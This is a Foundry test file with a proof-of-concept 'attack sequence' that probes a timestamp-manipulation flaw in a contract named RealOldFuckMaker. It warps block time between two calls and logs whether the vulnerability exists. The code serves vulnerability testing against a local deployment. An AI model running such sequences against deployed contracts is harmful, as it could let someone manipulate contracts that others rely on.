// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xf2570186500a46986f3139f65afedc2afe4f445d.sol";

contract RealOldFuckMakerTest is Test {
    RealOldFuckMaker public fuckMaker;
    address user = address(0xABBA);
    
    function setUp() public {
        fuckMaker = new RealOldFuckMaker();
    }

    function testTimestampManipulation() public {
        console2.log("--- BEFORE-Trigger Call 1 ---");
        (uint256 initialFucks, ) = fuckMaker.getUserStats(user);
        console2.log("Initial fucks: %s", initialFucks);
        assertEq(initialFucks, 0, "Initial fucks should be zero");
        
        console2.log("--- Trigger Call 1 ---");
        uint256 firstTimestamp = 1000;
        vm.warp(firstTimestamp);
        vm.prank(user);
        (bool call1Success, ) = address(fuckMaker).call(
            abi.encodeWithSignature("makeOldFucks(uint256)", 1)
        );
        
        console2.log("--- AFTER-Trigger Call 1 ---");
        if (!call1Success) {
            console2.log("Call 1 REVERTED");
            console2.log("Vulnerability not Exist: Attack sequence failed at first step");
            return;
        }
        (uint256 afterFirstFucks, ) = fuckMaker.getUserStats(user);
        console2.log("Fucks after first call: %s", afterFirstFucks);
        if (afterFirstFucks != 1) {
            console2.log("Vulnerability not Exist: Fucks should be 1 after first call");
            return;
        }

        console2.log("--- BEFORE-Trigger Call 2 ---");
        console2.log("Current fucks: %s", afterFirstFucks);
        
        console2.log("--- Trigger Call 2 ---");
        uint256 secondTimestamp = 2000;
        vm.warp(secondTimestamp);
        vm.prank(user);
        (bool call2Success, ) = address(fuckMaker).call(
            abi.encodeWithSignature("makeOldFucks(uint256)", 2)
        );
        
        console2.log("--- AFTER-Trigger Call 2 ---");
        if (!call2Success) {
            console2.log("Call 2 REVERTED");
            console2.log("Vulnerability not Exist: Attack sequence failed at second step");
            return;
        }
        (uint256 finalFucks, ) = fuckMaker.getUserStats(user);
        console2.log("Final fucks: %s", finalFucks);
        
        if (finalFucks == 3) {
            console2.log("Vulnerability Exists: Successful attack sequence execution");
        } else {
            console2.log("Vulnerability not Exist: Incorrect final state (expected 3)");
        }
    }
}